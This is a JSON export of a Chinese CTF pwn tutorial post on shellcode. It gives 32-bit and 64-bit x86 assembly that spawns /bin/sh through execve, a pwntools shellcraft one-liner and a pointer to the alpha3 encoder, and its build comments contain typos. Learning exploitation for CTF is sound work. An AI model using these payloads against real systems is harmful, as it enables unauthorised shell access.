{"title":"shellcode","uid":"33178a053863ba406bb965eb7a776aab","slug":"CTF/pwn/shellcode","date":"2022-01-18T04:55:28.000Z","updated":"2022-01-18T04:55:54.803Z","comments":true,"path":"api/articles/CTF/pwn/shellcode.json","keywords":null,"cover":null,"content":"<span id=\"more\"></span>\n\n<h1 id=\"shellcode\"><a href=\"#shellcode\" class=\"headerlink\" title=\"shellcode\"></a>shellcode</h1><h2 id=\"什么是shellcode\"><a href=\"#什么是shellcode\" class=\"headerlink\" title=\"什么是shellcode\"></a>什么是shellcode</h2><p>软件漏洞利用过程中使用一小段机器代码</p>\n<p>启动shell进行交互</p>\n<h3 id=\"可能存在的问题\"><a href=\"#可能存在的问题\" class=\"headerlink\" title=\"可能存在的问题\"></a>可能存在的问题</h3><p>shellcode只允许输入十几个字节</p>\n<p>无法调用系统函数(不知道system的地址)</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>触发中断（0x80或者syscall）</p>\n<h2 id=\"如何编写shellcode\"><a href=\"#如何编写shellcode\" class=\"headerlink\" title=\"如何编写shellcode\"></a>如何编写shellcode</h2><h3 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">;;nasm -f elf32 i386.asm\n;;ld -m elf_i386 -o i386 i386.o\n;;objdump -d i386\nglobal _start\n_start:\n\tpush &quot;&#x2F;sh&quot;\n\tpush &quot;&#x2F;bin&quot;\n\tmov ebx, esp;;ebx&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;\n\txor edx, edx;;edx&#x3D;0\n\txor ecx, ecx;;ecx&#x3D;0\n\tmov al, 0xb;;设置al&#x3D;0xb\n\tint 0x80<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">;;name -f elf64 x64.asm\n;;ld -m elf_x86 -o x64 x64.o\n;;objdump -d x64\nglobal _start\n_start:\n\tmov rbx, &#39;&#x2F;bin&#x2F;sh&#39;\n\tpush rbx\n\tpush rsp\n\tpop rdi\n\txor esi, esi\n\txor edx, edx\n\tpush 0x3b\n\tpop rax\n\tsyscall<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"pwntools快速生成shellcode\"><a href=\"#pwntools快速生成shellcode\" class=\"headerlink\" title=\"pwntools快速生成shellcode\"></a>pwntools快速生成shellcode</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\nshellcode<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h3><h4 id=\"mrctf2020-shellcode\"><a href=\"#mrctf2020-shellcode\" class=\"headerlink\" title=\"mrctf2020_shellcode\"></a>mrctf2020_shellcode</h4><h4 id=\"ciscn-2019-s-9\"><a href=\"#ciscn-2019-s-9\" class=\"headerlink\" title=\"ciscn_2019_s_9\"></a>ciscn_2019_s_9</h4><h4 id=\"pwnable-orw\"><a href=\"#pwnable-orw\" class=\"headerlink\" title=\"pwnable_orw\"></a>pwnable_orw</h4><h2 id=\"shellcode的变形\"><a href=\"#shellcode的变形\" class=\"headerlink\" title=\"shellcode的变形\"></a>shellcode的变形</h2><h4 id=\"mrctf-shellcode-revenge\"><a href=\"#mrctf-shellcode-revenge\" class=\"headerlink\" title=\"mrctf_shellcode_revenge\"></a>mrctf_shellcode_revenge</h4><h3 id=\"alpha3编码\"><a href=\"#alpha3编码\" class=\"headerlink\" title=\"alpha3编码\"></a>alpha3编码</h3><p>github.com/TaQini/alpha3.git</p>\n","feature":true,"text":" shellcode什么是shellcode软件漏洞利用过程中使用一小段机器代码 启动shell进行交互 可能存在的问题shellcode只允许输入十几个字节 无法调用系统函数(不知道system的地址) 解决触发中断（0x80或者syscall） 如何编写shellcode32...","link":"","photos":[],"count_time":{"symbolsCount":896,"symbolsTime":"1 mins."},"categories":[{"name":"CTF/PWN","slug":"CTF-PWN","count":3,"path":"api/categories/CTF-PWN.json"}],"tags":[{"name":"CTF PWN","slug":"CTF-PWN","count":3,"path":"api/tags/CTF-PWN.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#shellcode\"><span class=\"toc-text\">shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFshellcode\"><span class=\"toc-text\">什么是shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">可能存在的问题</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E5%86%B3\"><span class=\"toc-text\">解决</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode\"><span class=\"toc-text\">如何编写shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#32%E4%BD%8D\"><span class=\"toc-text\">32位</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#64%E4%BD%8D\"><span class=\"toc-text\">64位</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#pwntools%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90shellcode\"><span class=\"toc-text\">pwntools快速生成shellcode</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E9%A2%98\"><span class=\"toc-text\">例题</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#mrctf2020-shellcode\"><span class=\"toc-text\">mrctf2020_shellcode</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ciscn-2019-s-9\"><span class=\"toc-text\">ciscn_2019_s_9</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#pwnable-orw\"><span class=\"toc-text\">pwnable_orw</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#shellcode%E7%9A%84%E5%8F%98%E5%BD%A2\"><span class=\"toc-text\">shellcode的变形</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#mrctf-shellcode-revenge\"><span class=\"toc-text\">mrctf_shellcode_revenge</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#alpha3%E7%BC%96%E7%A0%81\"><span class=\"toc-text\">alpha3编码</span></a></li></ol></li></ol></li></ol>","author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Why So S1eepy","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"RE-BUU","uid":"ce6a61e69eea25b26a44cdf9f84d23a7","slug":"CTF/reverse/RE-BUU","date":"2022-01-18T07:17:52.000Z","updated":"2022-01-18T07:18:41.922Z","comments":true,"path":"api/articles/CTF/reverse/RE-BUU.json","keywords":null,"cover":null,"text":" BUUCTF-Reverse刷题记录新年快乐一个upx壳，怎么看出来的还不知道，等回头学会了再补 直接upx -d去壳，扔进idaF5看代码就是比较输入字符串和”HappyNewYear!”，因此这个字符串就是flag xor主函数是逻辑如下，遍历输入字符串，将当前位与前一位异...","link":"","photos":[],"count_time":{"symbolsCount":687,"symbolsTime":"1 mins."},"categories":[{"name":"CTF/REVERSE","slug":"CTF-REVERSE","count":2,"path":"api/categories/CTF-REVERSE.json"}],"tags":[{"name":"CTF REVERSE","slug":"CTF-REVERSE","count":2,"path":"api/tags/CTF-REVERSE.json"}],"author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Why So S1eepy","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"栈溢出基础","uid":"b0e5183f9443ee80e444d03488f07c6f","slug":"CTF/pwn/栈溢出基础","date":"2022-01-18T04:54:11.000Z","updated":"2022-01-18T04:55:01.853Z","comments":true,"path":"api/articles/CTF/pwn/栈溢出基础.json","keywords":null,"cover":[],"text":" 栈溢出基础C语言函数调用栈栈是程序运行时一块连续的内存区域，用来保存函数运行时的状态信息，包括函数的局部变量等 当发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶 函数调用结束时栈顶的函数(callee)状态被弹出，...","link":"","photos":[],"count_time":{"symbolsCount":781,"symbolsTime":"1 mins."},"categories":[{"name":"CTF/PWN","slug":"CTF-PWN","count":3,"path":"api/categories/CTF-PWN.json"}],"tags":[{"name":"CTF PWN","slug":"CTF-PWN","count":3,"path":"api/tags/CTF-PWN.json"}],"author":{"name":"S1eepy","slug":"blog-author","avatar":"/img/touxiang.jpg","link":"/","description":"Why So S1eepy","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}